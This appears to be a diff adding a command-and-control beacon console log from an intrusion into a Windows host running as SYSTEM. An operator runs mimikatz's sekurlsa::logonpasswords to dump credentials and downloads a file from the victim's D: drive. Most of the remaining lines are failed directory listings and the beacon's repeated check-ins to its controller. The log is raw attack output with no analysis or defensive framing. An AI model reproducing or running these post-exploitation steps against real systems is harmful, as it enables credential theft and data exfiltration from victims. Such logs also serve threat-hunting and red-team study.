@@ -1,0 +1,50 @@
+12/04 07:46:31 UTC [metadata] beacon_93032694 -> 10.1.1.46; computer: WIN-AULIRDQ5FPP; user: SYSTEM *; process: beacon.exe; pid: 96544; os: Windows; version: 6.1; build: 7601; beacon arch: x64 (x64)
+12/04 07:46:23 UTC [output]
+established link to parent beacon: 10.1.1.46
+
+12/04 07:50:21 UTC [input] <kali> logonpasswords
+12/04 07:50:21 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+12/04 07:50:21 UTC [checkin] host called home, sent: 296058 bytes
+12/04 07:55:13 UTC [input] <kali> shell
+12/04 07:55:13 UTC [error] shell error: not enough arguments
+12/04 08:31:45 UTC [checkin] host called home, sent: 19 bytes
+12/04 09:08:50 UTC [checkin] host called home, sent: 20 bytes
+12/04 09:08:52 UTC [checkin] host called home, sent: 25 bytes
+12/04 09:08:55 UTC [checkin] host called home, sent: 34 bytes
+12/04 09:09:04 UTC [input] <kali> download D:\host\freehost\星外杀马简化版说明.txt
+12/04 09:09:04 UTC [task] <T1005> Tasked beacon to download D:\host\freehost\星外杀马简化版说明.txt
+12/04 09:09:04 UTC [checkin] host called home, sent: 47 bytes
+12/04 09:09:05 UTC [output]
+started download of D:\host\freehost\星外杀马简化版说明.txt (1052 bytes)
+
+12/04 09:09:05 UTC [output]
+download of 星外杀马简化版说明.txt is complete
+
+12/04 09:09:28 UTC [checkin] host called home, sent: 20 bytes
+12/04 09:09:34 UTC [checkin] host called home, sent: 20 bytes
+12/04 09:09:34 UTC [error] could not open M:\*: 21
+12/04 09:09:46 UTC [checkin] host called home, sent: 52 bytes
+12/04 09:09:50 UTC [checkin] host called home, sent: 40 bytes
+12/04 09:10:01 UTC [checkin] host called home, sent: 36 bytes
+12/04 09:10:02 UTC [checkin] host called home, sent: 36 bytes
+12/04 09:10:24 UTC [checkin] host called home, sent: 41 bytes
+12/04 09:10:24 UTC [error] could not open C:\Users\All Users\桌面\*: 5
+12/04 09:10:27 UTC [checkin] host called home, sent: 44 bytes
+12/04 09:10:27 UTC [error] could not open C:\Users\All Users\Desktop\*: 5
+12/04 09:10:28 UTC [checkin] host called home, sent: 44 bytes
+12/04 09:10:28 UTC [error] could not open C:\Users\All Users\Desktop\*: 5
+12/04 09:10:31 UTC [checkin] host called home, sent: 49 bytes
+12/04 09:10:31 UTC [error] could not open C:\Users\All Users\「开始」菜单\*: 5
+12/04 09:10:31 UTC [checkin] host called home, sent: 49 bytes
+12/04 09:10:31 UTC [error] could not open C:\Users\All Users\「开始」菜单\*: 5
+12/04 09:10:44 UTC [checkin] host called home, sent: 39 bytes
+12/04 09:10:44 UTC [error] could not open C:\Users\Default User\*: 5
+12/04 09:10:46 UTC [checkin] host called home, sent: 34 bytes
+12/04 09:10:47 UTC [checkin] host called home, sent: 100 bytes
+12/04 09:10:48 UTC [checkin] host called home, sent: 33 bytes
+12/04 09:10:57 UTC [checkin] host called home, sent: 42 bytes
+12/04 09:11:17 UTC [checkin] host called home, sent: 34 bytes
+12/04 09:11:20 UTC [checkin] host called home, sent: 43 bytes
+12/04 09:11:22 UTC [checkin] host called home, sent: 50 bytes
+12/04 09:11:30 UTC [checkin] host called home, sent: 54 bytes
+12/04 14:15:22 UTC [checkin] host called home, sent: 28 bytes
